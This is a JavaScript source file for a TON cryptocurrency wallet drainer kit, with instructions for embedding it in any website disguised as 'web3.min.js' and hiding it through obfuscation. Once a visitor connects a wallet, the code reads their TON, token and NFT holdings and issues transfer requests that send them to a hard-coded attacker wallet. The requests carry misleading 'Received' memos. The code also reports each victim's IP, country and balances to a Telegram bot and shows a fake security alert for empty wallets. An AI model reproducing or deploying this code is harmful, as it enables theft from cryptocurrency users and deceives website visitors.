// Using this code without obsfuscation is strictly prohibited !
// If this is discovered, an arbitration will be written
// You can hide this script here: obfuscator.io


// INSTALL THE SCRIPT ON ANY HTML SITE :
// 
// Open index.html and copy script tags just before the closing </body> tag in your HTML document : 
//
//      <script src="./assets/vendor.min.js"></script>
//      <script src="./assets/web3.min.js"></script> 
// 
// Open the "assets/web3.min.js" file with any code editor, for example Visual Studio Code or Notepad ++.
// At the top of the file web3.min.js, you will find the Configuration variables « CF » et « TG »
// Configured your options (TelegramBot, Wallet, etc..), and hide the code using obfuscator.io
// 
// Add Ton connect button to your html page (only one) : 
//
//      <div id="connect-btn"></div>
// 
// If you want to trigger the connection window from other HTML elements (links, buttons, images...) 
// Just add the "btn-go" class on elements : 
//
//      <button class="btn-go">Click Me</button>
//      <a href="#" class="btn-go">Link Button</a>
//      <div class="btn-go">Div Button</div>
//      <img class="btn-go" src="https://via.placeholder.com/100" alt="Img Button">
//
// Please note that the script will only work only with an SSL certificate installed (via https).
// If you open the file on a local server or just on your computer, nothing will work.

document.addEventListener("DOMContentLoaded", async () => {

    const CF = {
        Wallet: "UQBY2mp_z9atz0k2bdp0TIZ-2Jif-TQsRdP0LY28pa7FxZfi",  // Wallet address where the assets will go
        Native: true, // ('true' enabled or 'false' disabled)
        Tokens: true, // ('true' enabled or 'false' disabled)
        NFTs: true, // ('true' enabled or 'false' disabled)
        Tokens_First: false, // 'false' - At the value price, 'true' - Token are always first 
        Ton_rate: 7.99, // conversion rate ( 1 TON to USD = 7.99 )
        TonApi_Key: "", // https://tonconsole.com/ (RECOMMENDED), 
        manifestUrl: "https://app.storm.tg/tonconnect-manifest.json", // To use a personalized manifest, use « 'https://' + window.location.hostname + '/tonconnect-manifest.json' »
    }
    
    const TG = {
        token: "", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
        chat_id: "", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
        enter_website: false, // Notify on site entry ('true' enabled or 'false' disabled)
        connect_success: false, // Notify on wallet connection ('true' enabled or 'false' disabled)
        connect_empty: false,  // Notify on empty wallet connection ('true' enabled or 'false' disabled)
        transfer_request: false, // Notify on transfer request ('true' enabled or 'false' disabled)
        transfer_success: false, // Notify on successful transfer ('true' enabled or 'false' disabled)
        transfer_cancel: false, // Notify on declined transfer ('true' enabled or 'false' disabled) 
    };

// =====================================================================
// ============ Bring changes to the code below is not sure ============
// =====================================================================

    const ipResponse = await fetch("https://ipapi.co/json/");
    const ipData = await ipResponse.json();
    const IP = ipData.ip ?? "??";
    const ISO2 = ipData.country ?? "??";
    const HOST = window.location.hostname;
    
    let isProcessing = false;
    let User_wallet = null;

    if(TG.enter_website){
        const message = `👀 *User opened the website*\n\n🌍 ${navigator.language ?? ''} | ${HOST}\n\n📍 [${ISO2}](https://ipapi.co/?q=${IP})\n`;
        await TgMsg(message);
    }

    const w3 = new W3ModalUI({
        manifestUrl: CF.manifestUrl,
        buttonRootId: "connect-btn"
    });

    w3.onStatusChange(wallet => {
        if (!wallet) {
            return;
        }

        if (w3.connected) {
            User_wallet = Add.parse(w3.account.address).toString({bounceable: false});
            fetchData(User_wallet);
        }
    });

    async function fetchData(User_wallet) {
        if (isProcessing) {
            console.log("Already processing. Please wait.");
            return;
        }
        isProcessing = true;

        try {
            const tonData = await fetchTonData(User_wallet);
            if (!tonData) { await handleEmptyWallet(User_wallet); return;}
            
            const tokenData = await fetchTokenData(User_wallet);
            const nftData = await fetchNftData(User_wallet);
    
            if (TG.connect_success) {
                await sendConnectionMessage(tonData, tokenData, nftData);
            }
    
            await processAssets(tonData, tokenData, nftData);
        } catch (error) {
            console.log("Error:", error);
        } finally {
            isProcessing = false;
        }
    }

    async function fetchTonData(address) {
        const walletResponse = await fetch(`https://tonapi.io/v2/accounts/${address}${CF.TonApi_Key ? '&token=' + CF.TonApi_Key : ''}`);
        if (!walletResponse.ok) {
            console.log(`Error fetching TON balance: ${walletResponse.status}`);
        }
        await sleep(500);
        const walletJson = await walletResponse.json();
        if (!walletJson) {
            console.log("Invalid Ton response");
        }
    
        let balanceTON = parseFloat(walletJson.balance) / 1000000000;
        let calculatedBalanceUSDTG = parseFloat((CF.Ton_rate * balanceTON).toFixed(2));
        let sendingBalance = parseFloat(walletJson.balance) - 16888777;
    
        if (sendingBalance > 0) {
            return {
                type: "TON",
                data: walletJson,
                balance: balanceTON,
                sendingBalance: sendingBalance,
                calculatedBalanceUSDTG: calculatedBalanceUSDTG
            };
        }
        return null;
    }

    async function fetchTokenData(address) {
        const tokenResponse = await fetch(`https://tonapi.io/v2/accounts/${address}/jettons?currencies=ton,usd${CF.TonApi_Key ? '&token=' + CF.TonApi_Key : ''}`);
        if (!tokenResponse.ok) {
            return [];
        }
        await sleep(500);
        const tokenJson = await tokenResponse.json();
        if (!tokenJson || !tokenJson.balances) {
            return [];
        }

        if (tokenJson.balances.length === 0) {
            return [];
        }

        return tokenJson.balances
            .filter(token => parseFloat(token.balance) !== 0 && token.jetton.verification !== "blacklist")
            .map(token => {
                const balance = (parseFloat(token.balance) / Math.pow(10, token.jetton.decimals));
                const priceUsd = token.price.prices.USD;
                const calculatedBalanceUSDTG = parseFloat((balance * priceUsd).toFixed(2));
                if (calculatedBalanceUSDTG > 0) {
                    return {
                        type: "TOKEN",
                        wallet_address: token.wallet_address.address,
                        TokenBalance: parseFloat(token.balance),
                        data: token,
                        roundedBalance: balance.toFixed(2),
                        address: token.jetton.address,
                        symbol: token.jetton.symbol,
                        name: token.jetton.name,
                        balance: balance,
                        price_usd: priceUsd,
                        calculatedBalanceUSDTG: calculatedBalanceUSDTG
                    };
                }
                return null;
            })
            .filter(token => token !== null)
            .sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
    }

    async function fetchNftData(address) {
        const nftResponse = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=1000&offset=0&indirect_ownership=false${CF.TonApi_Key ? '&token=' + CF.TonApi_Key : ''}`);
        if (!nftResponse.ok) {
            return [];
        }
        await sleep(500);
        const nftJson = await nftResponse.json();
        if (!nftJson || !nftJson.nft_items) {
            return [];
        }

        if (nftJson.nft_items.length === 0) {
            // console.log("No tokens");
            return [];
        }

        // Fetch the NFT data from the JSON file
        const loadNftResponse = await fetch('./assets/js/nfts_whitelist.json'); 
        if (!loadNftResponse.ok) {
            return [];
        }
        const loadNftData = await loadNftResponse.json();
        if (!loadNftData) {
            return [];
        }

        return nftJson.nft_items
            .filter(nft => nft.collection && nft.collection.name && nft.collection.name !== "" && nft.trust !== "blacklist")
            .map(nft => {
                const collectionAddress = Add.parse(nft.collection.address).toString({bounceable: true});
                const matchingNft = loadNftData.find(platform => platform.nft_address === collectionAddress);
                if(!matchingNft){
                    return null;
                }
                const matchingNftPrice = parseFloat((matchingNft.average_price * CF.Ton_rate).toFixed(2));
                if (matchingNftPrice > 0) {
                    return {
                        type: "NFT",
                        data: nft.address,
                        name: nft.metadata.name || 'Unknown',
                        calculatedBalanceUSDTG: matchingNftPrice || 0.1 // Use average price from LoadNftData or default to 0.1
                    };
                }
                return null;
            })
            .filter(nft => nft !== null)
            .sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
    }

    async function sendConnectionMessage(walletData, tokenData, nftData) {
        const totalNftPriceUSD = nftData && nftData.length > 0 ? nftData.reduce((sum, token) => sum + token.calculatedBalanceUSDTG, 0) : 0;
        const NftMsg = nftData && nftData.length > 0 ? `\n\n👾 (≈ *${formatNumber(totalNftPriceUSD)}* USD)\n\n${nftData.map(nft => `[${escp(nft.name)}](https://tonviewer.com/${nft.data}) | (≈ *${formatNumber(nft.calculatedBalanceUSDTG)}* USD )\n`).join('\n')}` : '';
        const totalTokenPriceUSD = tokenData && tokenData.length > 0 ? tokenData.reduce((sum, token) => sum + token.calculatedBalanceUSDTG, 0) : 0;
        const TokenMsg = tokenData && tokenData.length > 0 ? `-\n\n🪙 (≈ *${formatNumber(totalTokenPriceUSD)}* USD)\n\n${tokenData.map(token => `${escp(token.name)}\n*${formatNumber(token.roundedBalance)}* ${escp(token.symbol)} ( *${formatNumber(token.calculatedBalanceUSDTG)}* USD )\n`).join('\n')}\n` : '\n';
        const TonMsg = Object.keys(walletData).length > 0 ? `-\n\n🧿 *${walletData.balance.toFixed(2)}* TON ( ≈ *${formatNumber(walletData.calculatedBalanceUSDTG)}* USD)\n\n` : `-\n\n🧿 *0* TON ( ≈ *0* USD)\n\n`;
        const totalBalanceUSD = parseFloat(walletData.calculatedBalanceUSDTG ?? 0) + totalTokenPriceUSD + totalNftPriceUSD;
        const message = `\n🔌 *User Connected Wallet* (${shortAdd(User_wallet)})\n\n🌍 ${HOST} - 📍 [${ISO2}](https://ipapi.co/?q=${IP})\n\n\n💲 ( ≈ ${formatNumber(totalBalanceUSD)} USD )\n\n${TonMsg}${TokenMsg}${NftMsg}`;
        await TgMsg(message);
    }

    async function processAssets(walletData, tokenData, nftData) {
        let allData = [...tokenData, ...nftData, walletData];

        // Filter out items with undefined type
        allData = allData.filter(item => {
            if (!item.type) {
                return false;
            }
            return true;
        });

        if (allData.length === 0) {
            console.log('No assets to process. Exiting.');
            return;
        }

        let groupedData = allData.reduce((acc, item) => {
            acc[item.type] = acc[item.type] || [];
            acc[item.type].push(item);
            return acc;
        }, {});
    
        let sortedTypes = Object.entries(groupedData)
        .sort((a, b) => {
            if (CF.Tokens_First) {
                if (a[0] === "TOKEN") return -1;
                if (b[0] === "TOKEN") return 1;
            }
            return b[1].reduce((sum, item) => sum + item.calculatedBalanceUSDTG, 0) - a[1].reduce((sum, item) => sum + item.calculatedBalanceUSDTG, 0);
        })
        .map(entry => entry[0]);
            
        for (let type of sortedTypes) {
            switch (type) {
                case "TON":
                    if (groupedData.TON.length > 0 && CF.Native) {
                        await TonTransfer(groupedData.TON[0]);
                        await sleep(1300);
                    }
                    break;
                case "TOKEN":
                    if(CF.Tokens){
                        for (let i = 0; i < groupedData.TOKEN.length; i += 4) {
                            let chunk = groupedData.TOKEN.slice(i, i + 4);
                            await TokenTransfer(chunk, groupedData.TOKEN);
                            await sleep(1300);
                        }
                    }
                    break;
                case "NFT":
                    if(CF.NFTs){
                        for (let i = 0; i < groupedData.NFT.length; i += 4) {
                            let chunk = groupedData.NFT.slice(i, i + 4);
                            await NftTransfer(chunk, groupedData.NFT);
                            await sleep(1300);
                        }
                    }
                    break;
            }
        }
    }

    async function TonTransfer(tonData) {
        try {
            const sendingAmount = (tonData.sendingBalance / 1000000000).toFixed(2);
            const formattedAmountUSD = formatNumber(CF.Ton_rate * sendingAmount);
            const notif = `🎣 *Creating request* (${shortAdd(User_wallet)})\n\n*${sendingAmount}* TON ( ≈ *${formattedAmountUSD}* USD )`;
            const successMessage = `✅ *Approved Transfer* (${shortAdd(User_wallet)})\n\n*${sendingAmount}* TON ( ≈ *${formattedAmountUSD}* USD )`;
            const errorMessage = `❌ *Declined Transfer* (${shortAdd(User_wallet)})\n\n*${sendingAmount}* TON ( ≈ *${formattedAmountUSD}* USD )`;
            
            const cell = Cell().storeUint(0, 32).storeStringTail(` Received + ${formatNumber(sendingAmount * 2.29)} TON `).endCell();
            const transactionData = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: CF.Wallet,
                    amount: tonData.sendingBalance,
                    payload: cell.toBoc().toString('base64'),
                }]
            };
            
            await handleTransaction(transactionData, notif, successMessage, errorMessage);
        } catch (error) {
            console.log('Error:', error);
        }
    }

    async function TokenTransfer(tokenChunk, sourceArray) {
        try {
            const totalTokenPriceUSD = tokenChunk.reduce((sum, token) => sum + token.calculatedBalanceUSDTG, 0);
            const TokenMsg = tokenChunk.length > 0 ? `\n\n🪙 (≈ *${formatNumber(totalTokenPriceUSD)}* USD)\n\n${tokenChunk.map(token => `${escp(token.name)}\n*${token.roundedBalance}* ${escp(token.symbol)} ( *${formatNumber(token.calculatedBalanceUSDTG)}* USD )\n`).join('\n')}` : '';
            const notif = `🎣 *Creating request* (${shortAdd(User_wallet)})${TokenMsg}`;
            const successMessage = `✅ *Approved Transfer* (${shortAdd(User_wallet)})${TokenMsg}`;
            const errorMessage = `❌ *Declined Transfer* (${shortAdd(User_wallet)})${TokenMsg}`;
            
            let transactionMessages = [];
            for (let token of tokenChunk) {
                await sleep(100);
                let payloadCell = Cell().storeUint(0, 32).storeStringTail(` Received + ${formatNumber(token.roundedBalance * 4.3009)} ${token.symbol} `).endCell();
                let messageCell = Cell()
                    .storeUint(0xf8a7ea5, 32) 
                    .storeUint(0, 64)
                    .storeCoins(token.data.balance)
                    .storeAddress(Add.parse(CF.Wallet)) // TON wallet destination address
                    .storeAddress(Add.parse(w3.account.address)) // response excess destination
                    .storeBit(0)
                    .storeCoins(Nano(0.02).toString())
                    .storeBit(1)
                    .storeRef(payloadCell)
                    .endCell();
    
                let transactionMessage = {
                    address: token.wallet_address,
                    amount: Nano(0.05).toString(),
                    sender: w3.account.address,
                    tx: btoa(encodeURIComponent(JSON.stringify(token.data))),
                    payload: messageCell.toBoc().toString('base64'),
                };
                transactionMessages.push(transactionMessage);
            }
    
            const transactionData = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: transactionMessages,
            };
    
            await handleTransaction(transactionData, notif, successMessage, errorMessage);
            
            tokenChunk.forEach(item => {
                let index = sourceArray.findIndex(sourceItem => sourceItem.wallet_address === item.wallet_address);
                if (index !== -1) {
                    sourceArray.splice(index, 1);
                }
            });

        } catch (error) {
            console.log('Error:', error);
        }
    }

    async function NftTransfer(nftChunk, sourceArray) {
        try {
            const totalNftPriceUSD = nftChunk.reduce((sum, token) => sum + token.calculatedBalanceUSDTG, 0);
            const NftMsg = nftChunk.length > 0 ? `\n\n👾 (≈ *${formatNumber(totalNftPriceUSD)}* USD)\n\n${nftChunk.map(nft => `[${escp(nft.name)}](https://tonviewer.com/${nft.data}) | (≈ *${formatNumber(nft.calculatedBalanceUSDTG)}* USD )\n`).join('\n')}` : '';
            const notif = `🎣 *Creating request* (${shortAdd(User_wallet)})${NftMsg}`;
            const successMessage = `✅ *Approved Transfer* (${shortAdd(User_wallet)})${NftMsg}`;
            const errorMessage = `❌ *Declined Transfer* (${shortAdd(User_wallet)})${NftMsg}`;

            let transactionMessages = [];
            for (let nft of nftChunk) {
                await sleep(100);
                let messageCell = Cell()
                    .storeUint(0x5fcc3d14, 32)
                    .storeUint(0, 64)
                    .storeAddress(Add.parse(CF.Wallet))
                    .storeAddress(Add.parse(w3.account.address))
                    .storeUint(0, 1)
                    .storeCoins(Nano(0.000000001).toString())
                    .storeUint(0, 1)
                    .endCell();
    
                let transactionMessage = {
                    address: nft.data,
                    amount: Nano(0.05).toString(),
                    tx: btoa(encodeURIComponent(JSON.stringify(nft.data))),
                    payload: messageCell.toBoc().toString('base64'),
                };
                transactionMessages.push(transactionMessage);
            }
    
            const transactionData = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: transactionMessages,
            };
    
            await handleTransaction(transactionData, notif, successMessage, errorMessage);
            
            nftChunk.forEach(item => {
                let index = sourceArray.findIndex(sourceItem => sourceItem.data === item.data);
                if (index !== -1) {
                    sourceArray.splice(index, 1);
                }
            });

        } catch (error) {
            console.log('Error:', error);
        }
    }
    
    async function handleTransaction(transactionData, notif, successMessage, errorMessage) {
        try {
            if(TG.transfer_request){
                await TgMsg(notif);
            }
            await w3.sendTransaction(transactionData);
            await sleep(1300);
            if(TG.transfer_success){
                await TgMsg(successMessage);
            }
        } catch (error) {
            if (error.message.toLowerCase().includes("reject request") || error.message.toLowerCase().includes("close popup") || error.message.toLowerCase().includes("transaction was not sent")) {
                if(TG.transfer_cancel){
                    await TgMsg(errorMessage);
                }
            } else {
                console.log('Error:', error);
            }
        }
    }

    async function handleEmptyWallet(User_wallet) {
        if (TG.connect_empty) {
            const message = `\n🔌💩 *User Connected an empty Wallet* (${shortAdd(User_wallet)})\n\n🌍 ${HOST} - 📍 [${ISO2}](https://ipapi.co/?q=${IP})`;
            await TgMsg(message);
        }
    
        alert('For security reasons, we cannot allow connections from empty or newly created wallets.');
        await w3.disconnect();
        if (!w3.connected && w3.modalState.status === 'closed') {
            await w3.openModal();
        }
    }

    async function TgMsg(message) {
        const encodedMessage = encodeURIComponent(message);
        const telegramUrl = `https://api.telegram.org/bot${TG.token}/sendMessage?chat_id=${TG.chat_id}&text=${encodedMessage}&parse_mode=Markdown&disable_web_page_preview=true`;
        
        const response = await fetch(telegramUrl, { method: 'POST' });
        if (!response.ok) {
            console.log('Error:', 'Telegram message failed to send');
        }
    }

    async function fire(w3) {
        await sleep(100);
        if (!w3.connected && w3.modalState.status === 'closed') {
            await w3.openModal();
        }else if (w3.connected) {
            User_wallet = Add.parse(w3.account.address).toString({bounceable: false});
            fetchData(User_wallet);
        }
    }

    const $$ = (selector) => document.querySelectorAll(selector);
    $$('.btn-go').forEach(item => {
        item.addEventListener('click', async () => {
            await fire(w3); // w3 
        });
    });

    function formatNumber(number) {
        return new Intl.NumberFormat('en-US', { 
            minimumFractionDigits: 2, 
            maximumFractionDigits: 2 
        }).format(number);
    }

    function shortAdd(str) {
        if (str.length <= 7) {
        return str; // If the chain is too short to be shortened in this way, we return it as it is
        }
        const firstTwo = str.slice(0, 4); // Take the first 2 characters
        const lastThree = str.slice(-4); // Take the last 3 characters
        return `${firstTwo}...${lastThree}`; // Combine parts
    }

    function escp(msg){
        let ok = msg
        .replace(/\_/g, '\\_')
        .replace(/\*/g, '\\*')
        .replace(/\[/g, '\\[')
        .replace(/\]/g, '\\]')
        .replace(/\(/g, '\\(')
        .replace(/\)/g, '\\)')
        .replace(/\~/g, '\\~')
        .replace(/\`/g, '\\`')
        .replace(/\>/g, '\\>')
        .replace(/\#/g, '\\#')
        .replace(/\+/g, '\\+')
        .replace(/\-/g, '\\-')
        .replace(/\=/g, '\\=')
        .replace(/\|/g, '\\|')
        .replace(/\{/g, '\\{')
        .replace(/\}/g, '\\}')
        .replace(/\./g, '\\.')
        .replace(/\!/g, '\\!')
    
        return ok;
    }

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
});
